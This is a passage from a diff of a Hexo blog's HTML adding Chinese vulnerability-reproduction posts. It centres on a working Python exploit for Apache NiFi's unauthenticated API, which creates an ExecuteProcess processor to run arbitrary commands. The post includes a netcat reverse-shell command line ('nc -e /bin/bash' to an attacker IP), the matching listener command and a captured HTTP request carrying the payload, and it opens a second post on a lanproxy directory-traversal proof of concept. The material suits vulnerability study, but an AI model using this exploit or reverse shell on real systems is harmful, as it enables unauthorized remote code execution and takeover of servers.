g_id:</span><br><span class="line">            p_id &#x3D; self.create_process(g_id)</span><br><span class="line">            if p_id:</span><br><span class="line">                self.run_cmd(p_id&#x3D;p_id, cmd&#x3D;cmd)</span><br><span class="line">                self.clean_up(p_id&#x3D;p_id)</span><br><span class="line"></span><br><span class="line">    def run_cmd(self, p_id, cmd):</span><br><span class="line">        url &#x3D; self.url + &quot;&#x2F;nifi-api&#x2F;processors&#x2F;&quot; + p_id</span><br><span class="line">        cmd &#x3D; cmd.split(&quot; &quot;)</span><br><span class="line">        data &#x3D; &#123;</span><br><span class="line">            &#39;component&#39;: &#123;</span><br><span class="line">                &#39;config&#39;: &#123;</span><br><span class="line">                    &#39;autoTerminatedRelationships&#39;: [&#39;success&#39;],</span><br><span class="line">                    &#39;properties&#39;: &#123;</span><br><span class="line">                        &#39;Command&#39;: cmd[0],</span><br><span class="line">                        &#39;Command Arguments&#39;: &quot; &quot;.join(cmd[1:]),</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#39;schedulingPeriod&#39;: &#39;3600 sec&#39;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#39;id&#39;: p_id,</span><br><span class="line">                &#39;state&#39;: &#39;RUNNING&#39;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#39;revision&#39;: &#123;&#39;clientId&#39;: &#39;x&#39;, &#39;version&#39;: 1&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        print(data)</span><br><span class="line">        headers &#x3D; &#123;</span><br><span class="line">            &quot;Content-Type&quot;: &quot;application&#x2F;json&quot;,</span><br><span class="line">        &#125;</span><br><span class="line">        res &#x3D; req.put(url&#x3D;url, data&#x3D;json.dumps(data), headers&#x3D;headers, verify&#x3D;False)</span><br><span class="line">        return res.json()</span><br><span class="line"></span><br><span class="line">    def fetch_process_group(self):</span><br><span class="line">        url &#x3D; self.url + &quot;&#x2F;nifi-api&#x2F;process-groups&#x2F;root&quot;</span><br><span class="line">        try:</span><br><span class="line">            res &#x3D; req.get(url&#x3D;url, verify&#x3D;False)</span><br><span class="line">            data &#x3D; res.json()[&quot;id&quot;]</span><br><span class="line">            return data</span><br><span class="line">        except Exception as e:</span><br><span class="line">            pass</span><br><span class="line">        return 0</span><br><span class="line"></span><br><span class="line">    def create_process(self, process_group_id):</span><br><span class="line">        url &#x3D; self.url + &quot;&#x2F;nifi-api&#x2F;process-groups&#x2F;&quot; + process_group_id + &quot;&#x2F;processors&quot;</span><br><span class="line">        data &#x3D; &#123;</span><br><span class="line">            &#39;component&#39;: &#123;</span><br><span class="line">                &#39;type&#39;: &#39;org.apache.nifi.processors.standard.ExecuteProcess&#39;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#39;revision&#39;: &#123;</span><br><span class="line">                &#39;version&#39;: 0</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        headers &#x3D; &#123;</span><br><span class="line">            &quot;Content-Type&quot;: &quot;application&#x2F;json&quot;,</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            res &#x3D; req.post(url&#x3D;url, data&#x3D;json.dumps(data), headers&#x3D;headers, verify&#x3D;False)</span><br><span class="line">            return res.json()[&quot;id&quot;]</span><br><span class="line">        except Exception as e:</span><br><span class="line">            pass</span><br><span class="line">        return 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    if len(sys.argv) !&#x3D; 3:</span><br><span class="line">        print(&quot;rce.py url cmd&quot;)</span><br><span class="line">    else:</span><br><span class="line">        url &#x3D; sys.argv[1]  # http:&#x2F;&#x2F;192.168.1.1:8080</span><br><span class="line">        cmd &#x3D; sys.argv[2]  # nc -e &#x2F;bin&#x2F;bash 192.168.1.129 1234</span><br><span class="line">        e &#x3D; Exp(url)</span><br><span class="line">        e.exploit(cmd)</span><br></pre></td></tr></table></figure>
+
+<p>监听端口<br>nc -lvp 6666</p>
+<p>执行命令<br>python exp.py <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> “nc -e /bin/bash 192.168.1.102 6666”<br><strong>需要目标机上有netcat 并且支持-e选项</strong></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;nifi-api&#x2F;processors&#x2F;004e7b50-0177-1000-475a-ab13f94d6527 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.189.128:8080</span><br><span class="line">User-Agent: python-requests&#x2F;2.25.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 305</span><br><span class="line"></span><br><span class="line">&#123;&quot;component&quot;: &#123;&quot;config&quot;: &#123;&quot;autoTerminatedRelationships&quot;: [&quot;success&quot;], &quot;properties&quot;: &#123;&quot;Command&quot;: &quot;nc&quot;, &quot;Command Arguments&quot;: &quot;-e &#x2F;bin&#x2F;bash 192.168.189.134 1234&quot;&#125;, &quot;schedulingPeriod&quot;: &quot;3600 sec&quot;&#125;, &quot;id&quot;: &quot;004e7b50-0177-1000-475a-ab13f94d6527&quot;, &quot;state&quot;: &quot;RUNNING&quot;&#125;, &quot;revision&quot;: &#123;&quot;clientId&quot;: &quot;x&quot;, &quot;version&quot;: 1&#125;&#125;HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Thu, 14 Jan 2021 09:51:19 GMT</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Content-Security-Policy: frame-ancestors &#39;self&#39;</span><br><span class="line">X-XSS-Protection: 1; mode&#x3D;block</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">Cache-Control: private, no-cache, no-store, no-transform</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Length: 1745</span><br><span class="line">Server: Jetty(9.4.26.v20200117)</span><br><span class="line"></span><br><span class="line">...........X.n.8...B&#x2F;&#123;..H....H..k q..M....$...&amp;U..#.....([...A.-Z .....3.a...-..J..oA*8.v....)..K.k.a&#x2F;...;...3</span><br><span class="line">b*....4.s&#x2F;.h.E..,9..Q|v...(.....&gt;M....8;&#x3D;9&lt;.....&lt;........a|z....a|x&gt;8....	&#123;.i..</span><br><span class="line">.Rf........p......0....	Q.L&#x2F;....wV*..B.V.....4........Y...?.\-</span><br><span class="line">%...&#125;.......Ve1....O.$i......Er._.dy.K.;....4.ybii.C......u.g!-h:g!..n....2.:.wl.Rf..v3.u.</span><br><span class="line">.PmyNS. pYj..%.m..1.3...........p.......B...C.9&#x2F;..o..L...2fR.....R..j..3.V..[..!.0..q.*b....g...j...t.bH.).Bik....m...r.....YB..5... ...do.M....</span><br><span class="line">..X3...W53V...l.g..,.n.+1...|.26nYx......&#x3D;.P..%..&amp;b.</span><br><span class="line">.Ei..k.5[8...........7....Q.l.9.a..........Z, ......&#39;....&#125;.N.g. .. .fN:.|tL...c.s...R.:o.j...Y.1...h.4.XH..&lt;......_.Fr......f&#123;r.._@.b.&quot;....@.N.k&quot;5+..M!h5.Y..lR..&#123;...1......F....&#x2F;.s.oi......	.^..A.....g,..n........4L.f..K..tg&#123;.....H...5I...	...g..........&#x3D;..\...rV.......G...p.f@Q].&#123;)*.rO..Ql.^....Av</span><br><span class="line">.......EUW,kc..,g$..j....m......@.vI1)-jU&amp;S..x.p.:S%...-.e..m.....v&#x3D;....l..+.@:..t..#. 8..&gt;...%g&#125;]J..&#96;z@5+.&lt;..lI...	..G(I.V...A..r...4.....Yq..	f..%.Jr.j.&#125;)L.@i.</span><br><span class="line">..:pg.......w@.+....w@....V...,...M......n</span><br><span class="line">..(...YG...........2.e...kk..&#39;........dR..&amp;.&#x2F;..5?...i....[..5..1..</span><br><span class="line">...g.$W.. .2_..d...V..AZ</span><br><span class="line">....L.y)\..9.S.c..</span><br><span class="line">G,&#96;.E\..U...t.D.</span><br><span class="line">.......D9.\&#x3D;RQ......Za.9A&#x3D;It....h...,...|.u......41,;1.x......B]3kW.....;-&#x3D;k..I....Wg.q.%+.e.....s..Z...l..f.5X&#123;..h.W....4P.%..v&#96;.l].H&#125;..&#x3D;&gt;z...k.SH..(A	.up.t.....&#x3D;.B~z.x-.p..&#39;CV</span><br><span class="line">...i.p.&lt;:.&quot;8,...)4*8..B*</span><br><span class="line">.n.....G7.v.&#96;D....DLRa..&#x3D;..5N+.D...~.y..2.6H..1..;.Q..v..eDn*........2....^h. v..f..G0p...LS.7p.9.Z.C.n.......7..t..o........v9.Av.g.H.......K.t+....#...&lt;^......;#2.).....O....w.k...yV......O4.&#39;..........s,. &gt;......\M.x..f.....I..t^....y...............&quot;......~..&#39;P.(q.._5..Z....r............-.Q..4....cd7..._.)....l.&#125;&#125;tT....?.......M.x.M.....u$.V.&gt;.A.....&#x3D;.....V;...</span><br></pre></td></tr></table></figure>
+
+
+
+<p>参考文档：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/imjdl/Apache-NiFi-Api-RCE">https://github.com/imjdl/Apache-NiFi-Api-RCE</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/21/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/[CVE-2020-3019]lanproxy_%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/21/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%5BCVE-2020-3019%5Dlanproxy_%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">lanproxy 目录遍历漏洞（CVE-2020-3019）POC</a>
         </h2>
 
         <div class="post-meta">
@@ -355,16 +1046,16 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-count">10</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-count">3</span>
         <span class="site-state-item-name">categories</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">tags</span>
       </div>
   </nav>
